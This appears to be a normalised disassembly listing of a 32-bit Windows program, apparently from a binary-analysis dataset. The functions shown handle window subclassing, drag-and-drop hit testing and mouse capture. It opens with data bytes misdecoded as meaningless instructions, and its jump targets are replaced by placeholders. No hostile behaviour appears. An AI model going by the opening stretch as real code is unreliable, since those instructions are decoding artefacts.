add [ eax + 0x6000446b ] dl
xchg ebp eax
inc ebx
add al dl
xchg edx eax
inc ebx
add [ 0x6e695754 ] dl
inc ebx
outsd
outsb
je r-xdata
xor al 0x94
shl [ ebx + eax * 2 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
add [ eax + 0xc ] cl
inc esp
add [ edi + eax + 0x44 ] al
add [ esp + ecx ] ch
inc esp
add ah al
int 0x43
add [ eax - 0x2c ] bl
inc ebx
add al bh
loope r-xdata
mov [ ebx ] cs
inc ebx
add [ eax ] dl
fld [ ebx ]
nop
loop r-xdata
dec esi
popad
insd
mov eax eax
push 0x1004365
or al 0x54
inc edx
outsd
jb r-xdata
or cl [ eax ]
push esp
dec ecx
insd
int3
adc eax 0x15011400
add [ ecx ] edi
add [ 0x2c002b00 ] ch
add [ eax + eax ] dl
add [ edx - 0x1eb3ffbd ] dl
inc ebx
add ah dh
loopne r-xdata
inc edi
add [ esi ] al
add eax 0x20000300
add [ eax ] al
add [ ecx + eax ] eax
add [ ecx ] eax
add eax 0x12010201
add [ edi ] ebp
add [ eax ] dl
add ch [ esi ]
add [ edx ] al
add [ ebx - 0x7bff7e00 ] al
add [ ebp + 0x11030f00 ] al
add ebx [ edx ]
add [ 0x7001e00 ] bl
add [ eax ] cl
add [ 0x7b010e01 ] cl
add [ edi ] dh
mov al 0x2e
mov al 0x5
mov al 0x6
mov al 0x7
mov al 0xb
mov al 0xc
mov al 0xd
mov al 0xe
mov al 0x3b
mov al 0xf
mov al 0x10
mov al 0x11
mov al 0x19
mov al 0x22
mov al 0x1a
mov al 0x1b
mov al 0x1c
mov al 0x24
mov al 0x35
mov al 0x25
mov al 0x26
mov al 0x27
mov al 0x2f
mov al 0x0
mov ebp 0xbd02bd01
add al 0xbd
push es
mov ebp 0xb033b02c
xor al 0xb0
cmp [ eax - 0x4fc54fc7 ] dh
cmp al 0xb0
sbb [ ebx ] al
out dx eax
sub al 0x0
adc al 0x0
add [ eax + 0x69000001 ] cl
add [ edi ] cl
add [ ecx ] dl
add [ esi ] ecx
add [ ebp + ecx + 0x44 ] ch
add [ ebx + ebp * 8 ] bh
inc ebx
add [ esi + ebx + 0x9e80044 ] ch
inc esp
add al bl
or al 0x44
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add ah ah
inc ebx
add [ ecx + eax ] bh
add [ ebp + 0x43 ] dl
sub_437310
push ebp
mov ebp esp
push ecx
push ebx
lea ebx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x180 ] edx
mov eax [ rw-data ]
mov eax [ eax + 0x18c ]
push eax
push 0xfffffffc
mov eax [ ebp + 0x8 ]
push eax
call SetWindowLongA
push 0xfffffff0
mov eax [ ebp + 0x8 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
mov eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call SetPropA
mov eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call SetPropA
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov [ rw-data ] 0x0
call [ eax + 0x18c ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
pop ebx
pop ecx
pop ebp
retn 0x10
push 0xfffffff4
mov eax [ ebp + 0x8 ]
push eax
call GetWindowLongA
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
push 0xfffffff4
mov eax [ ebp + 0x8 ]
push eax
call SetWindowLongA
sub_4373c8
push ebx
push ecx
mov ebx eax
push esp
push ebx
call GetWindowThreadProcessId
test eax eax
je r-xdata
xor eax eax
pop edx
pop ebx
retn
call GetCurrentProcessId
cmp eax [ esp ]
jne r-xdata
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push ebx
call SendMessageA
pop edx
pop ebx
retn
sub_4373fc
push ebx
push esi
push ecx
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
pop edx
pop esi
pop ebx
retn
push esp
push ebx
call GetWindowThreadProcessId
test eax eax
je r-xdata
call GetCurrentProcessId
cmp eax [ esp ]
jne r-xdata
mov eax [ rw-data ]
call sub_4043a8
push eax
call GlobalFindAtomA
cmp ax [ rw-data ]
jne r-xdata
mov eax ebx
call sub_4373c8
mov esi eax
movzx eax [ rw-data ]
push eax
push ebx
call GetPropA
mov esi eax
jmp r-xdata
sub_437458
push ebx
push esi
mov ebx [ rw-data ]
mov ebx [ ebx ]
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
xor eax eax
pop esi
pop ebx
retn
push ecx
push edx
push eax
mov eax [ rw-data ]
push esi
call SendMessageA
pop esi
pop ebx
retn
sub_43763c
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax r-xdata
call sub_40c6a4
mov ebx eax
test ebx ebx
jne r-xdata
push edi
mov ecx ebx
dec ecx
mov edx 0x1
mov eax esi
call sub_404408
mov eax edi
mov edx esi
call sub_403f3c
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_437680
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax r-xdata
call sub_40c6a4
mov ebx eax
test ebx ebx
jne r-xdata
push edi
lea edx [ ebx + 0x1 ]
mov ecx 0x7fffffff
mov eax esi
call sub_404408
mov eax edi
mov edx esi
call sub_403f3c
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4376c4
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
push esp
push ebx
call GetWindowOrgEx
push 0x0
mov eax [ esp + 0x8 ]
add eax [ esi + 0x44 ]
push eax
mov eax [ esp + 0x8 ]
add eax [ esi + 0x40 ]
push eax
push ebx
call SetWindowOrgEx
mov eax ebx
push eax
mov ecx eax
mov edx 0x14
mov eax [ esi + 0x30 ]
call sub_43b724
push 0x0
mov eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x8 ]
push eax
push ebx
call SetWindowOrgEx
pop ecx
pop edx
pop esi
pop ebx
retn
sub_437740
push ebx
mov ebx eax
call ReleaseCapture
xor eax eax
mov [ rw-data ] eax
test ebx ebx
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_403324
test al al
jne r-xdata
mov eax ebx
call sub_440d58
push eax
call SetCapture
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov [ rw-data ] ebx
mov ebx [ ebx + 0x30 ]
sub_4377ec
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
xor eax eax
mov [ ebx ] eax
xor eax eax
jmp r-xdata
mov edx [ ebx ]
cmp edx [ esi + 0x8 ]
jl r-xdata
mov edx [ ebx ]
mov eax esi
call sub_414098
cmp edi [ eax + 0x4 ]
sete al
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
inc [ ebx ]
sub_437820
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_440d58
mov ebx eax
test eax eax
je r-xdata
mov eax ebx
pop ebx
pop ebp
retn
mov ebx eax
push eax
call GetParent
test eax eax
jne r-xdata
sub_437848
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax 0x8
call sub_4026dc
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ ebx ] eax
push ebp
call sub_437820
pop ecx
mov edi eax
mov [ ebx + 0x4 ] edi
lea ecx [ ebp - 0x8 ]
mov edx edi
mov eax esi
call sub_4377ec
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_413eec
mov ecx ebx
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_414114
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4378a4
push ebx
push esi
push edi
mov edi eax
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax edi
call sub_413f20
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_414098
mov edx 0x8
call sub_4026fc
inc esi
dec ebx
jne r-xdata
sub_4378d8
push ebx
push esi
push edi
push ecx
mov ebx eax
xor edi edi
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax edi
pop edx
pop edi
pop esi
pop ebx
retn
dec eax
jne r-xdata
call GetDesktopWindow
push eax
call GetTopWindow
mov esi eax
jmp r-xdata
xor edx edx
mov eax ebx
call sub_414098
mov edi [ eax ]
jmp r-xdata
test edi edi
jne r-xdata
test esi esi
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
call sub_4377ec
test al al
je r-xdata
push 0x2
push esi
call __imp_GetWindow
mov esi eax
mov eax [ ebx + 0x4 ]
mov edx [ esp ]
mov eax [ eax + edx * 4 ]
mov edi [ eax ]
jmp r-xdata
sub_43793c
mov ecx [ edx + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ edx + 0x8 ]
mov [ eax + 0x8 ] ecx
mov ecx [ edx + 0xc ]
mov [ eax + 0xc ] ecx
mov ecx [ edx + 0x10 ]
mov [ eax + 0x10 ] ecx
mov ecx [ edx + 0x14 ]
mov [ eax + 0x14 ] ecx
mov ecx [ edx + 0x18 ]
mov [ eax + 0x18 ] ecx
mov ecx [ edx + 0x20 ]
mov [ eax + 0x20 ] ecx
mov ecx [ edx + 0x24 ]
mov [ eax + 0x24 ] ecx
mov ecx [ edx + 0x28 ]
mov [ eax + 0x28 ] ecx
mov ecx [ edx + 0x2c ]
mov [ eax + 0x2c ] ecx
retn
sub_43799c
push ebx
push esi
add esp 0xffffff00
mov esi edx
mov ebx eax
mov edx esp
mov eax [ ebx ]
call sub_4030e8
mov edx esp
mov eax esi
call sub_40414c
add esp 0x100
pop esi
pop ebx
retn
sub_4379d8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_437aa2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
cmp eax 0x215
jg r-xdata
sub eax 0xbd00
je r-xdata
je r-xdata
mov eax [ ebx + 0x4 ]
sub eax 0x11
je r-xdata
dec eax
je r-xdata
xor eax eax
call sub_438af8
jmp r-xdata
sub eax 0x200
je r-xdata
mov eax [ rw-data ]
add eax 0xc
call sub_438480
jmp r-xdata
sub eax 0xa
je r-xdata
cmp [ ebx + 0x4 ] 0x11
jne r-xdata
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0x8 ]
call sub_4069ec
lea eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
push eax
call ClientToScreen
lea eax [ ebp - 0xc ]
call sub_438480
jmp r-xdata
sub eax 0x2
je r-xdata
mov [ ebx + 0xc ] 0x1
xor eax eax
call sub_438af8
jmp r-xdata
mov eax [ rw-data ]
add eax 0xc
call sub_438480
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov al 0x1
call sub_438af8
jmp r-xdata
sub eax 0x3
je r-xdata
jmp r-xdata
sub_437aa7
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_45a544
call sub_4039a0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
call sub_438af8
sub_437b00
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_437b2a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_437b90
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43793c
mov eax esi
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x38 ]
mov [ ebx + 0x38 ] eax
sub_437bbc
push ebp
mov ebp esp
push ecx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ esi + 0x38 ]
mov si 0xffdd
call sub_403394
pop edi
pop esi
pop ecx
pop ebp
retn 0x4
sub_437be8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov ebx eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
push eax
mov ecx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x24 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x38 ]
mov si 0xffdf
call sub_403394
xor edx edx
sub_437c40
push ebx
mov ebx eax
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
call sub_44290c
sub_437c60
push ebx
mov ebx eax
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
call sub_4428f4
sub_437c84
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_437b6c
mov dl 0x1
mov eax [ r-xdata ]
call sub_41d468
mov esi eax
mov [ ebx + 0x40 ] esi
mov edx 0xffffff
xor eax eax
call sub_4240cc
mov edx eax
mov eax esi
call sub_41d5ec
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4034bc
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403514
pop [ fs : 0x0 ]
add esp 0xc
sub_437ce8
push ebx
push esi
call sub_403524
mov ebx edx
mov esi eax
mov eax [ esi + 0x40 ]
call sub_403198
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403188
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40350c
sub_437d18
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_437b90
mov eax esi
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
mov dl [ eax + 0x54 ]
mov [ ebx + 0x54 ] dl
mov edx [ eax + 0x58 ]
mov [ ebx + 0x58 ] edx
mov dl [ eax + 0x6c ]
mov [ ebx + 0x6c ] dl
push esi
lea esi [ eax + 0x44 ]
lea edi [ ebx + 0x44 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push esi
lea esi [ eax + 0x5c ]
lea edi [ ebx + 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov edx [ eax + 0x40 ]
mov eax [ ebx + 0x40 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_437d74
push ebp
mov ebp esp
push esi
push edi
mov edi edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax [ esi + 0x38 ]
mov si 0xffe5
call sub_403394
pop edi
pop esi
pop ebp
retn 0x4
sub_437d98
push ebx
push esi
mov ebx edx
mov ecx eax
mov eax ecx
cdq
xor eax edx
sub eax edx
mov esi eax
mov eax ebx
cdq
xor eax edx
sub eax edx
cmp esi eax
jge r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov eax ecx
pop esi
pop ebx
retn
sub_437dbc
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov eax [ ebx + 0xc ]
mov edx [ esp ]
cmp eax edx
jl r-xdata
sub edx eax
mov ecx [ esp + 0x8 ]
sub ecx eax
mov eax ecx
xchg edx eax
call sub_437d98
mov esi eax
jmp r-xdata
cmp eax [ esp + 0x8 ]
jle r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ esp + 0x4 ]
cmp eax edx
jl r-xdata
xor esi esi
sub edx eax
mov ecx [ esp + 0xc ]
sub ecx eax
mov eax ecx
xchg edx eax
call sub_437d98
jmp r-xdata
cmp eax [ esp + 0xc ]
jle r-xdata
test esi esi
jne r-xdata
xor eax eax
neg eax
push eax
neg esi
push esi
lea eax [ ebx + 0x44 ]
push eax
call OffsetRect
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_437e78
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
mov edi ebx
cmp esi [ edi + 0x4 ]
jne r-xdata
cmp [ edi + 0x8 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov edx ebx
cmp esi [ edx + 0x8 ]
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
push esi
call GetWindowRect
push [ edi + 0x10 ]
push [ edi + 0xc ]
lea eax [ ebp - 0x10 ]
push eax
call PtInRect
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
cmp esi [ edx ]
jne r-xdata
xor eax eax
mov [ edx + 0x14 ] 0x1
jmp r-xdata
mov [ edi + 0x8 ] esi
or eax 0xffffffff
or eax 0xffffffff
xor ecx ecx
mov [ edx + 0x8 ] ecx
jmp r-xdata
sub_437ee4
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov ebx eax
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
add eax 0xfffffff7
call sub_438334
mov esi eax
mov [ ebp - 0x14 ] esi
push 0x4
push esi
call GetWindow
mov edx [ rw-data ]
mov edx [ edx ]
cmp eax [ edx + 0x30 ]
je r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_4373fc
mov esi eax
test esi esi
je r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi ebx
jmp r-xdata
jmp r-xdata
mov eax [ esi + 0x30 ]
test eax eax
jne r-xdata
mov eax [ esi + 0x30 ]
test eax eax
jne r-xdata
mov esi eax
mov eax esi
call sub_440d58
mov edi eax
mov [ ebp - 0x18 ] edi
cmp edi [ ebp - 0x14 ]
je r-xdata
mov esi eax
mov eax esi
call sub_440d58
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
mov edx [ ebp + 0x8 ]
mov esi eax
jmp r-xdata
xor eax eax
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_440d58
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov eax [ esi + 0x30 ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x14 ]
push eax
call GetWindowRect
mov eax [ ebp + 0x8 ]
add eax 0xfffffff7
push eax
mov eax [ ebp + 0x8 ]
dec eax
push eax
lea ecx [ ebp - 0x3c ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x10 ]
mov eax ebx
mov si 0xffbd
call sub_403394
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
mov [ ebp - 0x8 ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x9 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax - 0x5 ]
mov [ ebp - 0xc ] edx
lea eax [ ebp - 0x1c ]
push eax
push sub_437e78
call GetCurrentThreadId
push eax
call EnumThreadWindows
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov esi eax
mov eax esi
call sub_440d58
mov [ ebp - 0x1c ] eax
jmp r-xdata
lea eax [ ebp - 0x3c ]
push eax
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x2c ]
push eax
call IntersectRect
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x38 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x38 ]
mov eax [ eax + 0xa0 ]
call sub_440d58
cmp eax [ ebp - 0x14 ]
je r-xdata
sub_43807c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
xor eax eax
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
call sub_440d58
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_440d58
push eax
call IsChild
cmp eax 0x1
sbb eax eax
inc eax
pop ebp
retn
sub_4380c0
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov esi eax
lea edi [ ebp - 0x9 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x10 ] edx
xor eax eax
mov [ ebp - 0x18 ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x11
call GetKeyState
test ax 0x8000
setne al
mov edx [ rw-data ]
mov edx [ edx ]
xor al [ edx + 0xb4 ]
je r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ rw-data ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
inc ebx
xor edi edi
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_4378d8
mov [ ebp - 0x18 ] eax
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x18 ]
call sub_437ee4
pop ecx
test al al
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_414098
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x10 ]
je r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
xor eax eax
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x14 ]
call sub_440d58
push eax
call IsWindowVisible
test eax eax
je r-xdata
push ebp
call sub_43807c
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0xa0 ]
cmp eax [ ebp - 0x14 ]
jne r-xdata
mov [ ebp - 0x1 ] 0x1
lea eax [ ebp - 0x9 ]
push eax
lea eax [ ebp - 0x1 ]
push eax
lea ecx [ ebp - 0x28 ]
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x14 ]
mov si 0xffbd
call sub_403394
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_43f888
dec eax
jle r-xdata
push [ ebp - 0x5 ]
push [ ebp - 0x9 ]
lea eax [ ebp - 0x28 ]
push eax
call PtInRect
test eax eax
je r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_437848
sub_43821c
push ebx
push esi
push edi
mov ebx edx
mov esi eax
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
jne r-xdata
mov edi esi
mov edx edi
mov eax [ rw-data ]
call sub_4140f4
test bl bl
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403168
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
inc eax
jne r-xdata
mov edx eax
mov eax [ rw-data ]
call sub_413f38
mov edx edi
mov eax [ rw-data ]
call sub_413eec
jmp r-xdata
sub_43827c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x4 ] ecx
xor ecx ecx
test eax eax
je r-xdata
mov eax ecx
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx ]
mov [ ebp - 0x18 ] ebx
mov ebx [ ecx + 0x4 ]
mov [ ebp - 0x14 ] ebx
mov ecx [ ebp + 0xc ]
mov [ ebp - 0xc ] ecx
mov ecx [ ebp - 0x4 ]
mov [ ebp - 0x10 ] ecx
cmp [ rw-data ] 0x2
sete cl
mov [ ebp - 0x8 ] cl
lea ecx [ ebp - 0x18 ]
push ecx
and edx 0x7f
push edx
push 0xb02f
push eax
call SendMessageA
mov ecx eax
sub_4382d4
push ebx
push esi
push ecx
mov esi eax
xor ebx ebx
test esi esi
je r-xdata
mov eax ebx
pop edx
pop esi
pop ebx
retn
push esp
push esi
call GetWindowThreadProcessId
test eax eax
je r-xdata
call GetCurrentProcessId
cmp eax [ esp ]
jne r-xdata
mov eax [ rw-data ]
call sub_4043a8
push eax
call GlobalFindAtomA
cmp ax [ rw-data ]
jne r-xdata
mov eax esi
call sub_4373c8
test eax eax
setne bl
movzx eax [ rw-data ]
push eax
push esi
call GetPropA
test eax eax
setne bl
jmp r-xdata
sub_438334
push ebx
push [ eax + 0x4 ]
push [ eax ]
call WindowFromPoint
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_4382d4
test al al
jne r-xdata
push ebx
call GetParent
mov ebx eax
test ebx ebx
jne r-xdata
sub_438360
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
test cl cl
jne r-xdata
mov eax ebx
mov edx [ ebp + 0x8 ]
call sub_4380c0
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
call sub_438334
mov [ esi ] eax
push 0x0
push ebx
mov eax [ esi ]
mov ecx [ rw-data ]
mov dl 0x5
call sub_43827c
mov ebx eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn 0x4
mov eax ebx
call sub_440d58
mov [ esi ] eax
sub_4383b0
push ebx
push esi
mov ebx eax
xor eax eax
mov edx [ rw-data ]
mov esi [ edx + 0x4 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
push esi
mov eax [ rw-data ]
add eax 0xc
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x8 ]
mov ecx [ rw-data ]
mov edx ebx
call sub_43827c
cmp eax 0x1
sbb eax eax
inc eax
sub_4383ec
push ebx
push esi
push edi
xor edi edi
mov eax [ rw-data ]
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x1a7 ] 0x0
je r-xdata
cmp [ esi + 0x178 ] 0x0
je r-xdata
mov eax esi
call sub_43f7f4
test eax eax
je r-xdata
mov eax esi
call sub_43f7f4
dec eax
jne r-xdata
mov eax [ rw-data ]
add eax 0xc
xor edx edx
call sub_438e1c
mov ebx eax
jmp r-xdata
xor edx edx
mov eax [ esi + 0x178 ]
call sub_414098
mov edx [ rw-data ]
cmp eax [ edx + 0x38 ]
je r-xdata
test ebx ebx
je r-xdata
cmp esi ebx
jne r-xdata
mov edx ebx
mov eax [ esi + 0x178 ]
call sub_4140f4
cmp eax 0xffffffff
je r-xdata
mov ebx [ ebx + 0x30 ]
mov edx eax
mov eax esi
call sub_43f808
mov edi eax
jmp r-xdata
sub_438480
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi eax
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
mov cl [ eax + 0x9b ]
lea edx [ esp + 0x4 ]
mov eax edi
call sub_438360
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
sub eax [ edi ]
cdq
xor eax edx
sub eax edx
cmp eax [ rw-data ]
jge r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x9b ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
sub eax [ edi + 0x4 ]
cdq
xor eax edx
sub eax edx
cmp eax [ rw-data ]
jl r-xdata
cmp [ rw-data ] 0x0
setne [ esp + 0x4 ]
mov [ rw-data ] 0x2
mov [ rw-data ] 0x1
mov [ esp + 0x4 ] 0x0
jmp r-xdata
mov eax [ rw-data ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ rw-data ]
mov eax [ rw-data ]
call sub_4427c8
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
mov edx [ edi ]
mov [ eax + 0xc ] edx
mov edx [ edi + 0x4 ]
mov [ eax + 0x10 ] edx
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov al 0x1
call sub_4383b0
cmp [ rw-data ] 0x0
je r-xdata
